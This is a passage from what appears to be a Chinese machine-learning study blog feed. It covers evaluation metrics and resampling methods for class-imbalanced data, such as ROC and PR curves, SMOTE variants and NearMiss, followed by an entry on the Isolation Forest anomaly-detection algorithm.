xmlns="http://www.w3.org/1998/Math/MathML"><mi>F</mi><mi>P</mi><mi>R</mi><mo>+</mo><mfrac><mn>1</mn><mi>N</mi></mfrac></math>。最后的到所有样本点的TPR和FPR值，用线段相连。</p><blockquote><p><a href="https://github.com/massquantity/Class-Imbalance/tree/master/">massquantity/Class-Imbalance: 《机器学习之类别不平衡问题》文章代码</a></p></blockquote><h4 id="ROC的优点"><a href="#ROC的优点" class="headerlink" title="ROC的优点"></a>ROC的优点</h4><p><img src="http://files.shanqianche.cn/202168/1623131643148.png" alt="混淆矩阵图"></p><ol><li><p>兼顾正例和负例的权衡。因为TPR聚焦于正例，FPR聚焦于与负例，使其成为一个比较均衡的评估方法。</p></li><li><p>ROC曲线选用的两个指标，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>T</mi><mi>P</mi><mi>R</mi><mo>=</mo><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mi>P</mi></mfrac><mo>=</mo><mfrac><mrow><mi>T</mi><mi>P</mi></mrow><mrow><mi>T</mi><mi>P</mi><mo>+</mo><mi>F</mi><mi>N</mi></mrow></mfrac></math>，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>F</mi><mi>P</mi><mi>R</mi><mo>=</mo><mfrac><mrow><mi>F</mi><mi>P</mi></mrow><mi>N</mi></mfrac><mo>=</mo><mfrac><mrow><mi>F</mi><mi>P</mi></mrow><mrow><mi>F</mi><mi>P</mi><mo>+</mo><mi>T</mi><mi>N</mi></mrow></mfrac></math>，都不依赖于具体的类别分布。</p><p> 注意TPR用到的TP和FN同属<font color="#FF1493">P</font>列，FPR用到的FP和TN同属<font color="#1E90FF">N</font>列，<font color="#7FFF00">所以即使P或N的整体数量发生了改变，也不会影响到另一列</font>。也就是说，即使正例与负例的比例发生了很大变化，ROC曲线也不会产生大的变化，而像Precision使用的TP和FP就分属两列，则易受类别分布改变的影响。</p></li></ol><p><a href="https://ccrma.stanford.edu/workshops/mir2009/references/ROCintro.pdf">参考文献</a>中举了个例子，负例增加了10倍，ROC曲线没有改变，而PR曲线则变了很多。作者认为这是ROC曲线的优点，即具有<font color="#0000FF">鲁棒性</font>，在类别分布发生明显改变的情况下依然能客观地识别出较好的分类器。</p><blockquote><p><font color="#006400">代码验证</font><br><a href="https://www.cnblogs.com/massquantity/p/8592091.html">相关资料</a></p></blockquote><h4 id="ROC的缺点"><a href="#ROC的缺点" class="headerlink" title="ROC的缺点"></a>ROC的缺点</h4><ol><li>上文提到ROC曲线的优点是不会随着类别分布的改变而改变，但这在某种程度上也是其缺点。因为负例N增加了很多，而曲线却没变，这等于产生了大量FP。像信息检索中如果主要关心正例的预测准确性的话，这就不可接受了。</li><li>在类别不平衡的背景下，负例的数目众多致使FPR的增长不明显，导致ROC曲线呈现一个过分乐观的效果估计。ROC曲线的横轴采用FPR，根据<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>FPR</mi><mo>=</mo><mfrac><mrow><mi>F</mi><mi>P</mi></mrow><mi>N</mi></mfrac><mo>=</mo><mfrac><mrow><mi>F</mi><mi>P</mi></mrow><mrow><mi>F</mi><mi>P</mi><mo>+</mo><mi>T</mi><mi>N</mi></mrow></mfrac></math>，当负例N的数量远超正例P时，FP的大幅增长只能换来FPR的微小改变。<font color="#B22222">结果是虽然大量负例被错判成正例，在ROC曲线上却无法直观地看出来。</font>（当然也可以只分析ROC曲线左边一小段）<br>举个例子，假设一个数据集有正例20，负例10000，开始时有20个负例被错判，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>F</mi><mi>P</mi><mi>R</mi><mo>=</mo><mfrac><mn>20</mn><mrow><mn>20</mn><mo>+</mo><mn>9980</mn></mrow></mfrac><mo>=</mo><mn>0</mn><mo>.</mo><mn>002</mn></math>，接着又有20个负例错判，<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>F</mi><mi>P</mi><msub><mi>R</mi><mn>2</mn></msub><mo>=</mo><mfrac><mn>40</mn><mrow><mn>40</mn><mo>+</mo><mn>9960</mn></mrow></mfrac><mo>=</mo><mn>0</mn><mo>.</mo><mn>004</mn></math>，在ROC曲线上这个变化是很细微的。而与此同时Precision则从原来的0.5下降到了0.33，在PR曲线上将会是一个大幅下降。</li></ol><h3 id="PR-Precision-Recall-曲线"><a href="#PR-Precision-Recall-曲线" class="headerlink" title="PR(Precision Recall)曲线"></a>PR(Precision Recall)曲线</h3><p>PR曲线展示的是Precision vs Recall的曲线，PR曲线与ROC曲线的相同点是都采用了TPR (Recall)，都可以用AUC来衡量分类器的效果。不同点是ROC曲线使用了FPR，而PR曲线使用了Precision，因此<font color="#8A2BE2">PR曲线的两个指标都聚焦于正例</font>。<font color="#8A2BE2">类别不平衡问题中由于主要关心正例</font>，所以在此情况下PR曲线被广泛认为<font color="#FF8C00">优于</font>ROC曲线。</p><p>PR曲线的绘制与ROC曲线类似，PR曲线的AUC面积计算公式为：</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><munder><mo>&#x2211;</mo><mi>n</mi></munder><mo>(</mo><msub><mi>R</mi><mi>n</mi></msub><mo>-</mo><msub><mi>R</mi><mrow><mi>n</mi><mo>-</mo><mn>1</mn></mrow></msub><mo>)</mo><msub><mi>P</mi><mi>n</mi></msub></math></p><blockquote><p><a href="https://github.com/massquantity/Class-Imbalance/tree/master/">massquantity/Class-Imbalance: 《机器学习之类别不平衡问题》文章代码</a></p></blockquote><p><strong><font color="#FF00FF">使用场景</font></strong></p><ol><li>ROC曲线由于<font color="#1E90FF">兼顾</font>正例与负例，所以适用于评估分类器的<font color="#B22222">整体性</font>能，相比而言PR曲线完全聚焦于<font color="#FF00FF">正例</font>。</li><li>如果有多份数据且存在不同的类别分布，比如信用卡欺诈问题中每个月正例和负例的比例可能都不相同，这时候如果只想单纯地比较分类器的性能且剔除类别分布改变的影响，则ROC曲线比较适合，因为<font color="#1E90FF">类别分布改变</font>可能使得PR曲线发生变化时好时坏，这种时候难以进行模型比较；反之，如果想<font color="#FF00FF">测试不同类别分布下对分类器的性能</font>的影响，则PR曲线比较适合。</li><li>如果想要评估在相同的类别分布下正例的预测情况，则宜选PR曲线。</li><li>类别不平衡问题中，ROC曲线通常会给出一个乐观的效果估计，所以大部分时候还是PR曲线更好。</li><li>最后可以根据具体的应用，在曲线上找到最优的点，得到相对应的precision，recall，f1 score等指标，去调整模型的阈值，从而得到一个符合具体应用的模型。</li></ol><h2 id="采样方法"><a href="#采样方法" class="headerlink" title="采样方法"></a>采样方法</h2><blockquote><p><font color="#FF1493">前提：</font>章节二三主要谈的是类别不平衡的评估指标，因此我们可以选择选择具体的类别不平衡问题的方法。</p></blockquote><p>采样方法大致可分为<font color="#00CED1">过采样 (oversampling)</font> 和<font color="#2F4F4F">欠采样 (undersampling) </font>，虽然过采样和降采样主题思想简单，但这些年来研究出了很多变种，本篇挑一些来具体阐述。见下思维导图：</p><p><img src="http://files.shanqianche.cn/202168/1623137294136.png" alt="采样方法"></p><h3 id="过采样"><a href="#过采样" class="headerlink" title="过采样"></a>过采样</h3><ol><li>随机过采样</li></ol><p>随机过采样顾名思义就是从样本少的类别中随机抽样，再将抽样得来的样本添加到数据集中。然而这种方法如今已经不大使用了，因为重复采样往往会导致<font color="#1E90FF">严重的过拟合</font>，因而现在的主流过采样方法是通过某种方式人工合成一些少数类样本，从而达到类别平衡的目的，而这其中的鼻祖就是SMOTE。</p><ol start="2"><li>SMOTE</li></ol><p>SMOTE (synthetic minority oversampling technique) 的思想概括起来就是在<font color="#00FFFF">少数类</font>样本之间进行插值来产生额外的样本。具体地，对于一个少数类样本<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi mathvariant="bold">X</mi><mi>i</mi></msub></math>使用K近邻法(k值需要提前指定)，求出离<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi mathvariant="bold">X</mi><mi>i</mi></msub></math>距离最近的k个少数类样本，其中距离定义为样本之间n维特征空间的欧氏距离。然后从k个近邻点中随机选取一个，使用下列公式生成新样本：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi mathvariant="bold">x</mi><mtext>new&#xA0;</mtext></msub><mo>=</mo><msub><mi mathvariant="bold">x</mi><mi>i</mi></msub><mo>+</mo><mfenced><mrow><msub><mover><mi mathvariant="bold">x</mi><mo>^</mo></mover><mi>i</mi></msub><mo>-</mo><msub><mi mathvariant="bold">x</mi><mi>i</mi></msub></mrow></mfenced><mo>&#xD7;</mo><mi>&#x3B4;</mi></math><br>其中 <math xmlns="http://www.w3.org/1998/Math/MathML"><mover><mi mathvariant="bold">X</mi><mo>^</mo></mover></math> 为选出的k近邻点，δ∈[0,1]是一个随机数。下图就是一个SMOTE生成样本的例子，使用的是3-近邻，可以看出SMOTE生成的样本一般就在<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi mathvariant="bold">x</mi><mi>i</mi></msub></math>和<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mover><mi mathvariant="bold">x</mi><mo>^</mo></mover><mi>i</mi></msub></math>相连的直线上：</p><p><img src="http://files.shanqianche.cn/202169/1623220386942.png" alt="SMOTE生成的样本"></p><p>SMOTE会随机选取少数类样本用以合成新样本，而不考虑周边样本的情况，这样容易带来两个<font color="#FF1493">问题</font>：</p><ol><li>如果选取的少数类样本周围也都是少数类样本，则新合成的样本不会提供太多有用信息。这就像支持向量机中远离margin的点对决策边界影响不大。</li><li>如果选取的少数类样本周围都是多数类样本，这类的样本可能是噪音，则新合成的样本会与周围的多数类样本产生大部分重叠，致使分类困难。</li></ol><p>总的来说我们希望新合成的少数类样本能处于两个类别的边界附近，这样往往能提供足够的信息用以分类。而这就是下面的 <strong>Border-line SMOTE</strong> 算法要做的事情。</p><blockquote><p><font color="#bf242a">知识补充</font><a href="https://blog.csdn.net/lemonaha/article/details/53410465#31-k%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95">k近邻法–统计学习方法总结_lemonaha的博客-CSDN博客</a><br> k近邻法（k-nearest neighbor,<font color="#0000FF"> k-NN</font>）是一种基本分类与回归方法。这里只讨论分类问题中的k近邻法。k近邻法的输入为实例的特征向量，对应于特征空间的点；输出为实例的类别，可以取多类。k近邻法假设给定一个训练数据集，其中的实例类别已定。分类时，对新的实例，根据其k个最近邻的训练实例的类别，通过多数表决等方法进行预测。因此，k近邻法不具有显式的学习过程。k近邻法实际上利用训练数据集对特征向量空间进行划分，并作为其分类的“模型”。**<font color="#1E90FF">k值的选择、距离度量及分类决策规则是k近邻法的三个基本要素</font>**。</p></blockquote><ol start="3"><li>Border-line SMOTE</li></ol><p>这个算法会先将所有的少数类样本分成三类，如下图所示：</p><ul><li>“noise” ： 所有的k近邻个样本都属于多数类</li><li>“danger” ： 超过一半的k近邻样本属于<font color="#0000FF">多</font>数类</li><li>“safe”： 超过一半的k近邻样本属于<font color="#0000FF">少</font>数类</li></ul><p><img src="http://files.shanqianche.cn/202169/1623220611894.png" alt="Border-line SMOTE"></p><p>  <font color="#ff7500">Border-line SMOTE</font>算法只会从处于”<em>danger</em>“状态的样本中随机选择，然后用SMOTE算法产生新的样本。处于”danger“状态的样本代表靠近”边界“附近的少数类样本，而处于边界附近的样本往往更<font color="#B8860B">容易被误分类</font>。因而 Border-line SMOTE 只对那些靠近”边界“的少数类样本进行人工合成样本，而 SMOTE 则对所有少数类样本一视同仁。</p><p>Border-line SMOTE 分为两种: Borderline-1 SMOTE 和 Borderline-2 SMOTE。 Borderline-1 SMOTE 在合成样本时,是式中的<math xmlns="http://www.w3.org/1998/Math/MathML"><mover><mi mathvariant="bold">x</mi><mo>^</mo></mover></math>是一个<font color="#1E90FF">少数类样本</font>，而 Borderline-2 SMOTE 中的<math xmlns="http://www.w3.org/1998/Math/MathML"><mover><mi mathvariant="bold">x</mi><mo>^</mo></mover></math>则是k近邻中的<font color="#FF1493">任意</font>一个样本。</p><ol start="4"><li>ADASYN</li></ol><p><font color="#8B008B">ADASYN</font>名为自适应合成抽样(adaptive synthetic sampling)，其最大的特点是<font color="#006400">采用某种机制自动决定每个少数类样本需要产生多少合成样本</font>，而不是像SMOTE那样对每个少数类样本合成同数量的样本。具体流程如下：</p><ol><li><p>首先计算需要合成的样本总量：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>G</mi><mo>=</mo><mfenced><mrow><msub><mi>S</mi><mrow><mi>m</mi><mi>a</mi><mi>j</mi></mrow></msub><mo>-</mo><msub><mi>S</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mrow></mfenced><mo>&#xD7;</mo><mi>&#x3B2;</mi></math><br>其中<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>S</mi><mrow><mi>m</mi><mi>a</mi><mi>j</mi></mrow></msub></math>为多数类样本数量，<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>S</mi><mi>min</mi></msub></math>为少数类样本数量，β∈[0,1]为系数。G即为总共想要<font color="#8A2BE2">合成的少数类样本数量</font>，如果β=1则是合成后各类别数目相等。</p></li><li><p>对于每个少类别样本xi，找出其K近邻个点，并计算：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>&#x393;</mi><mi>i</mi></msub><mo>=</mo><mfrac><mrow><msub><mi>&#x394;</mi><mi>i</mi></msub><mo>/</mo><mi>K</mi></mrow><mi>Z</mi></mfrac></math><br>其中Δi为K近邻个点中多数类样本的数量，Z为规范化因子以确保 Γ 构成一个分布。这样若一个少数类样本<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi mathvariant="bold">x</mi><mi>i</mi></msub></math>的周围多数类样本越多，则其 Γi 也就越高。</p></li><li><p>最后对每个少类别样本<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi mathvariant="bold">x</mi><mi>i</mi></msub></math>计算需要合成的样本数量<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi mathvariant="bold">g</mi><mi>i</mi></msub></math>，再用SMOTE算法合成新样本：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>g</mi><mi>i</mi></msub><mo>=</mo><msub><mi>&#x393;</mi><mi>i</mi></msub><mo>&#xD7;</mo><mi>G</mi></math><br>可以看到ADASYN利用分布Γ来自动决定每个少数类样本所需要合成的样本数量，这等于是给每个少数类样本施加了一个权重，周围的多数类样本越多则权重越高。ADASYN的缺点是<font color="#A52A2A">易受离群点的影响</font>，如果一个少数类样本的K近邻都是多数类样本，则其权重会变得相当大，进而会在其周围生成较多的样本。</p></li></ol><p>下面利用sklearn中的 <em>make_classification</em> 构造了一个不平衡数据集，各类别比例为{0:54, 1:946}。原始数据，SMOTE，Borderline-1 SMOTE，Borderline-2 SMOTE和ADASYN的比较见下图，<font color="#0000FF">左侧为过采样后的决策边界</font>，<font color="#8B008B">右侧为过采样后的样本分布情况</font>，<font color="#B8860B">可以看到过采样后原来少数类的决策边界都扩大了，导致更多的多数类样本被划为少数类了</font>：</p><blockquote><p><font color="#0000FF">知识补充</font><br>决策边界顾名思义就是需要分类的数据中，区分不同类别的边界。</p></blockquote><pre><code>    原始数据</code></pre><p><img src="http://files.shanqianche.cn/202169/1623222264899.png" alt="原始数据"><br>        SMOTE<br><img src="http://files.shanqianche.cn/202169/1623222317451.png" alt="SMOTE过采样"><br>        Borderline-1 SMOTE<br><img src="http://files.shanqianche.cn/202169/1623222382482.png" alt="Borderline-1 SMOTE"><br>        Borderline-2 SMOTE<br><img src="http://files.shanqianche.cn/202169/1623222404250.png" alt="Borderline-2 SMOTE"><br>        ADASYN<br><img src="http://files.shanqianche.cn/202169/1623222425227.png" alt="ADASYN"></p><p>从上图我们也可以比较几种过采样方法各自的特点。用 <code>SMOTE</code> 合成的样本分布比较平均，而<code>Border-line SMOTE</code>合成的样本则集中在类别边界处。<code>ADASYN</code>的特性是一个少数类样本周围多数类样本越多，则算法会为其生成越多的样本，从图中也可以看到生成的样本大都来自于原来与多数类比较靠近的那些少数类样本。</p><h3 id="欠采样"><a href="#欠采样" class="headerlink" title="欠采样"></a>欠采样</h3><ol><li><p>随机欠采样</p><p> 随机欠采样的思想同样比较简单，就是从多数类样本中随机选取一些剔除掉。这种方法的缺点是<font color="#0000FF">被剔除的样本可能包含着一些重要信息</font>，致使学习出来的模型效果不好。</p></li><li><p>EasyEnsemble 和 BalanceCascade<br>  EasyEnsemble和BalanceCascade采用集成学习机制来<font color="#8A2BE2">处理传统随机欠采样中的信息丢失</font>问题。</p></li></ol><ul><li>EasyEnsemble将多数类样本随机<font color="#00FFFF">划分成n个子集</font>，每个子集的数量等于少数类样本的数量，这相当于欠采样。接着将每个子集与少数类样本结合起来分别训练一个模型，最后将n个模型集成，这样虽然每个子集的样本少于总体样本，但集成后总信息量并不减少。</li><li>如果说EasyEnsemble是基于无监督的方式从多数类样本中生成子集进行欠采样，那么BalanceCascade则是采用了<font color="#7FFFD4">有监督</font>结合Boosting的方式。在第n轮训练中，将从多数类样本中抽样得来的子集与少数类样本结合起来训练一个基学习器H，训练完后多数类中能被H正确分类的样本会被剔除。在接下来的第n+1轮中，从被剔除后的多数类样本中产生子集用于与少数类样本结合起来训练，最后将不同的基学习器集成起来。BalanceCascade的有监督表现在每一轮的基学习器起到了在多数类中选择样本的作用，而其Boosting<font color="#bf242a">特点则体现在每一轮丢弃被正确分类的样本，进而后续基学习器会更注重那些之前分类错误的样本。</font></li></ul><blockquote><p><font color="#0000FF">知识补充</font>基学习器<br><a href="https://www.biaodianfu.com/boosting.html">机器学习算法之Boosting – 标点符</a><br>同质集成中的个体学习器又称为基学习器（base learner），相应的学习算法也被称为基学习算法（base learning algorithm）。</p></blockquote><ol start="3"><li>NearMiss</li></ol><p><font color="#725e82"><strong>NearMiss</strong></font>本质上是一种<font color="#BDB76B">原型选择</font>(prototype selection)方法，即从多数类样本中选取最具代表性的样本用于训练，主要是为了缓解随机欠采样中的信息丢失问题。NearMiss采用一些<font color="#A52A2A">启发式的规则</font>来选择样本，根据规则的不同可分为3类：</p><ul><li>NearMiss-1：选择到最近的K个少数类样本平均距离最近的多数类样本</li><li>NearMiss-2：选择到最远的K个少数类样本平均距离最近的多数类样本</li><li>NearMiss-3：对于每个少数类样本选择K个最近的多数类样本，目的是保证每个少数类样本都被多数类样本包围</li></ul><p>NearMiss-1和NearMiss-2的计算<font color="#0000FF">开销很大</font>，因为需要计算每个多类别样本的K近邻点。另外，NearMiss-1易受离群点的影响，如下面第二幅图中合理的情况是处于边界附近的多数类样本会被选中，然而由于右下方一些少数类离群点的存在，其附近的多数类样本就被选择了。相比之下NearMiss-2和NearMiss-3不易产生这方面的问题。</p><p><img src="http://files.shanqianche.cn/202169/1623224933174.png" alt="图一Oniginal data"></p><p><img src="http://files.shanqianche.cn/202169/1623225034300.png" alt="图二Resampling using Nearmiss-1"></p><p><img src="http://files.shanqianche.cn/202169/1623225086130.png" alt="图三Resampling using Nearmiss-2"></p><p><img src="http://files.shanqianche.cn/202169/1623225124104.png" alt="图四Resampling using Nearmiss-3"></p><ol start="4"><li>数据清洗方法 (data cleaning tichniques)</li></ol><p>这类方法主要<font color="#8A2BE2">通过某种规则来清洗重叠的数据</font>，从而达到欠采样的目的，而这些规则往往也是启发性的，下面进行简要阐述：</p><ul><li><p><font color="#ff7500">Tomek Link</font>：Tomek Link表示<font color="#7FFFD4">不同类别</font>之间距离最近的一对样本，即<font color="#bf242a">这两个样本互为最近邻且分属不同类别</font>。这样如果两个样本形成了一个Tomek Link，则要么其中一个是噪音，要么两个样本都在边界附近。这样通过移除Tomek Link就能“清洗掉”类间重叠样本，使得互为最近邻的样本皆属于同一类别，从而能更好地进行分类。</p><pre><code>  下图一上为原始数据，图二上为SMOTE后的数据，图三虚线标识出Tomek Link，图四为移除Tomek Link后的数据集，可以看到不同类别之间样本重叠减少了很多。</code></pre></li></ul><p><img src="http://files.shanqianche.cn/202169/1623226151018.png" alt="图一"></p><p><img src="http://files.shanqianche.cn/202169/1623226162443.png" alt="图二"></p><p><img src="http://files.shanqianche.cn/202169/1623226175192.png" alt="图三"></p><p><img src="http://files.shanqianche.cn/202169/1623226186988.png" alt="图四"></p><ul><li><font color="#ff7500"> Edited Nearest Neighbours(ENN)</font>：对于属于多数类的一个样本，如果其K个近邻点有超过一半都不属于多数类，则这个样本会被剔除。这个方法的另一个变种是所有的K个近邻点都不属于多数类，则这个样本会被剔除。、</li></ul><p>最后，数据清洗技术<font color="#0000FF">最大的缺点</font>是无法控制欠采样的数量。由于都在某种程度上采用了K近邻法，而事实上大部分多数类样本周围也都是多数类，因而能剔除的多数类样本比较有限。</p><h3 id="过采样和欠采样结合"><a href="#过采样和欠采样结合" class="headerlink" title="过采样和欠采样结合"></a>过采样和欠采样结合</h3><p>上文中提到SMOTE算法的缺点是生成的少数类样本容易与周围的多数类样本产生重叠难以分类，而数据清洗技术恰好可以处理掉重叠样本，所以可以将二者结合起来形成一个pipeline，先过采样再进行数据清洗。主要的方法是 <code>SMOTE + ENN</code> 和 <code>SMOTE + Tomek</code> ，其中 <code>SMOTE + ENN</code> 通常能清除更多的重叠样本，如下图：</p><p><img src="http://files.shanqianche.cn/202169/1623227628385.png" alt="Resampling using Original"></p><p><img src="http://files.shanqianche.cn/202169/1623227661187.png" alt="Resampling using SMOTE"></p><p><img src="http://files.shanqianche.cn/202169/1623227708226.png" alt="Resampling using SMOTE + ENN"></p><p><img src="http://files.shanqianche.cn/202169/1623227766137.png" alt="Resampling using SMOTE + TOMEK"></p><hr><p><strong><font color="#DC143C">★ 采样方法的效果</font></strong></p><p><a href="https://www.cnblogs.com/massquantity/p/9382710.html">机器学习之类别不平衡问题 (3) —— 采样方法 - massquantity - 博客园</a></p><h2 id="省心的方法"><a href="#省心的方法" class="headerlink" title="省心的方法"></a>省心的方法</h2><h3 id="主动收集数据"><a href="#主动收集数据" class="headerlink" title="主动收集数据"></a>主动收集数据</h3><p>针对少量样本数据，可以尽可能去扩大这些少量样本的数据集，或者尽可能去增加他们特有的特征来丰富数据的多样性（尽量转化成情况1）。譬如，如果是一个情感分析项目，在分析数据比例时发现负样本（消极情感）的样本数量较少，那么我们可以尽可能在网站中搜集更多的负样本数量，或者花钱去买，毕竟数据少了会带来很多潜在的问题。</p><h3 id="将任务转换成异常检测问题、"><a href="#将任务转换成异常检测问题、" class="headerlink" title="将任务转换成异常检测问题、"></a>将任务转换成异常检测问题、</h3><p>如果少数类样本太少，少数类的结构可能并不能被少数类样本的分布很好地表示，那么用平衡数据或调整算法的方法不一定有效。如果这些少数类样本在特征空间中再分布的比较散，情况会更加糟糕。这时候不如将其转换为无监督的异常检测算法，不用过多的去考虑将数据转换为平衡问题来解决。</p><h3 id="调整权重"><a href="#调整权重" class="headerlink" title="调整权重"></a>调整权重</h3><p>可以简单的设置损失函数的权重，让模型增加对多数类的惩罚，更多的关注少数类。在python的scikit-learn中我们可以使用class_weight参数来设置权重。</p><p>另外，调整权重方法也适合于这种情况：不同类型的错误所造成的后果不同。例如在医疗诊断中，错误地把健康人诊断为患者可能会带来进一步检查的麻烦，但是错误地把患者诊断为健康人，则可能会丧失了拯救生命的最佳时机；再如，门禁系统错误地把可通行人员拦在门外，将使得用户体验不佳，但错误地把陌生人放进门内，则会造成严重的安全事故；在信用卡盗用检查中，将正常使用误认为是盗用，可能会使用户体验不佳，但是将盗用误认为是正常使用，会使用户承受巨大的损失。为了权衡不同类型错误所造成的不同损失，可为错误赋予“非均等代价”（unequal cost）。</p><h3 id="阈值调整（threshold-moving）"><a href="#阈值调整（threshold-moving）" class="headerlink" title="阈值调整（threshold moving）"></a>阈值调整（threshold moving）</h3><p>直接基于原始训练集进行学习，但在用训练好的分类器进行预测时，将原本默认为0.5的阈值调整到 <math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mo>|</mo><mi>P</mi><mo>|</mo></mrow><mrow><mo>(</mo><mo>|</mo><mi>P</mi><mo>|</mo><mo>+</mo><mo>|</mo><mi>N</mi><mo>|</mo><mo>)</mo></mrow></mfrac></math>即可。（大部分是负样本，因此分类器倾向于给出较低的分数）</p><h2 id="类别不平横影响模型的输出"><a href="#类别不平横影响模型的输出" class="headerlink" title="类别不平横影响模型的输出"></a>类别不平横影响模型的输出</h2><p>许多模型的输出是基于阈值的，大部分模型的默认阈值为输出值的中位数。比如逻辑回归的输出范围为[0,1]，当某个样本的输出大于0.5就会被划分为正例，反之为反例。在数据的类别不平衡时，采用默认的分类阈值可能会导致输出全部为反例，产生虚假的高准确度，导致分类失败。</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
            <tag> machine learning </tag>
            
            <tag> data mining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孤立森林（Isolation Forest）</title>
      <link href="/2021/05/31/%E5%AD%A4%E7%AB%8B%E6%A3%AE%E6%9E%97%EF%BC%88Isolation%20Forest%EF%BC%89/"/>
      <url>/2021/05/31/%E5%AD%A4%E7%AB%8B%E6%A3%AE%E6%9E%97%EF%BC%88Isolation%20Forest%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p><img src="http://files.shanqianche.cn/2021531/1622426214147.png" alt="数据蛋糕"></p><p>假设我们用一个随机超平面来切割（split）数据空间（data space）, 切一次可以生成两个子空间（想象拿刀切蛋糕一分为二）。</p><p>之后我们再继续用一个随机超平面来切割每个子空间，循环下去，直到每子空间里面只有一个数据点为止。</p><blockquote><p><font color="#8B008B">满足的条件</font></p><ul><li>数据本身不可再分割</li><li>二叉树达到限定的最大深度</li></ul></blockquote><p>直观上来讲，我们可以发现那些密度很高的簇是可以被切很多次才会停止切割，但是那些密度很低的点很容易很早的就停到一个子空间里了。</p><p><font color="#6495ED">异常检测原理的理解：</font>由于异常值的数量较少且与大部分样本的疏离性，因此，异常值会被更早的孤立出来，也即异常值会距离iTree的根节点更近，而正常值则会距离根节点有更远的距离。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>孤立森林算法主要针对的是<strong>连续型结构化</strong>数据中的异常点。</p><p><font color="#FF1493">理论前提</font></p><ul><li>异常数据占总样本量的比例很小</li><li>异常点的特征值与正常点的差异很大</li></ul><p><img src="http://files.shanqianche.cn/2021531/1622426925434.png" alt="数据"></p><p>上图中，中心的白色空心点为正常点，即处于高密度群体中。四周的黑色实心点为异常点，散落在高密度区域以外的空间。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>孤立森林算法是基于 <strong>Ensemble</strong> 的异常检测方法，因此具有<font color="#7FFF00">线性的时间复杂度</font>。且精准度较高，在处理大数据时速度快，所以目前在工业界的应用范围比较广。常见的场景包括：网络安全中的攻击检测、金融交易欺诈检测、疾病侦测、噪声数据过滤（数据清洗）等。</p><blockquote><p><font color="#006400">知识补充</font>集成学习算法 (Ensemble Learning)<br>统机器学习算法 (例如：决策树，人工神经网络，支持向量机，朴素贝叶斯等) 的目标都是寻找一个最优分类器尽可能的将训练数据分开。集成学习 (Ensemble Learning) 算法的基本思想就是将多个分类器<font color="#8FBC8F">组合</font>，从而实现一个预测效果更好的<font color="#8A2BE2">集成分类器</font>。</p></blockquote><blockquote><p><font color="#FF00FF">知识补充：</font><br><a href="https://blog.zuishuailcq.xyz/2021/05/31/%E7%AE%97%E6%B3%95%E7%9A%84%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/">算法的性能指标 | 吾辈之人，自当自强不息！</a></p></blockquote><h2 id="孤立森林的创新点"><a href="#孤立森林的创新点" class="headerlink" title="孤立森林的创新点"></a>孤立森林的创新点</h2><ol><li><font color="#D2691E">Partial models</font>：在训练过程中，每棵孤立树都是随机选取部分样本</li><li><font color="#D2691E">No distance or density measures</font>：不同于 KMeans、DBSCAN 等算法，孤立森林不需要计算有关距离、密度的指标，可大幅度提升速度，减小系统开销</li><li><font color="#D2691E"> Linear time complexity</font>：因为基于 ensemble，所以有线性时间复杂度。通常树的数量越多，算法越稳定</li><li><font color="#D2691E">Handle extremely large data size</font>：由于每棵树都是独立生成的，因此可部署在大规模分布式系统上来加速运算</li></ol>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
            <tag> machine learning </tag>
            
            <tag> data mining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拟合</title>
      <link href="/2021/05/31/%E6%8B%9F%E5%90%88/"/>
      <url>/2021/05/31/%E6%8B%9F%E5%90%88/</url>
      
